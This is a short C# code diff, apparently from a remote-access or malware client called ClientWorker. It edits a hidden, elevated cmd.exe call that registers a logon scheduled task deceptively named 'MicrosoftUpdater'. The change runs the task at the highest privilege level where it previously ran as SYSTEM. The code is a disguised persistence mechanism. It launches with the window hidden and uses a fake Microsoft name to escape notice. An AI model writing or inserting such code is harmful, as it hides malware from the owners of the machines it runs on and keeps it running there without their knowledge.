@@ -217,7 +217,7 @@ namespace ClientWorker
                 {
                     FileName = "cmd.exe",
                     Verb = "runas",
-                    Arguments = "/C SCHTASKS /Create /RU SYSTEM /SC ONLOGON /TN MicrosoftUpdater /TR " + fileParth + StartData.service,
+                    Arguments = "/C SCHTASKS /Create /RL HIGHEST /SC ONLOGON /TN MicrosoftUpdater /TR " + fileParth + StartData.service,
                     WindowStyle = ProcessWindowStyle.Hidden
                 }
             }.Start();
